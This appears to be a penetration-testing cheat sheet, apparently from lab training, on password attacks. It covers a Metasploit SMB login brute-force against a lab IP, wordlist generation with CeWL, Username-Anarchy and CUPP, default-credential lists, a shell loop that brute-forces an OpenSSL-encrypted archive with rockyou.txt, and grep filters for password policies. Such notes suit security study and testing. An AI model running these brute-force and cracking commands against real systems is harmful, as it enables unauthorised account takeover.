# Metasploit Brute Force SMB Login

```
msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options
Module options (auxiliary/scanner/smb/smb_login):

Name               Current Setting  Required  Description
----               ---------------  --------  -----------

ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
BLANK_PASSWORDS    false            no        Try blank passwords for all users
BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
DB_ALL_PASS        false            no        Add all passwords in the current database to the list
DB_ALL_USERS       false            no        Add all users in the current database to the list
DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
PASS_FILE                           no        File containing passwords, one per line
PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
RECORD_GUEST       false            no        Record guest-privileged random logins to the database
RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT              445              yes       The SMB service port (TCP)
SMBDomain          .                no        The Windows domain to use for authentication
SMBPass                             no        The password for the specified username
SMBUser                             no        The username to authenticate as
STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
THREADS            1                yes       The number of concurrent threads (max one per host)
USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
USER_AS_PASS       false            no        Try the username as the password for all users
USER_FILE                           no        File containing usernames, one per line
VERBOSE            true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list

msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list

msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run
```

# Custom Wordlist

## Generating Wordlists Using CeWL

CeWL uses a WebCrawler to extract important information about a company and then generates a wordlist.

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## Username-Anarchy (Username Wordlist Generation)

```bash
./username-anarchy -i /home/ltnbob/names.txt 
```

### Username-Anarchy using specified format

```bash
/username-anarchy --input-file DATA/users  --select-format first,flast,first.last,firstl > DATA/names-list
```

## **CUPP**

```bash
cupp -i #interactive mode
```

# Default Credentials

[GitHub - ihebski/DefaultCreds-cheat-sheet: One place for all the default credentials to assist the Blue/Red teamers activities on finding devices with default password 🛡️](https://github.com/ihebski/DefaultCreds-cheat-sheet)

# Default Credentials - Routers

[https://www.softwaretestinghelp.com/default-router-username-and-password-list/](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

# **Cracking OpenSSL Encrypted Archives**

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

#
# Filter wordlist based on a password policy

**SCENARIO (Password Policy)**

- Minimum length: 8 characters
- Must include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number

## Filter with Grep

### **Minimun character length**

```bash
grep -E '^.{8,}$' wordlist.txt > new-wordlist.txt
```

### At least one uppercase letter

```bash
grep -E '[A-Z]' new-wordlist.txt > new-wordlist2.txt
```

### **At least one lowercase letter**

```bash
grep -E '[a-z]' new-wordlist2.txt > new-wordlist3.txt
```

### At least one number

```bash
grep -E '[0-9]' new-wordlist3.txt > final-wordlist.txt
```
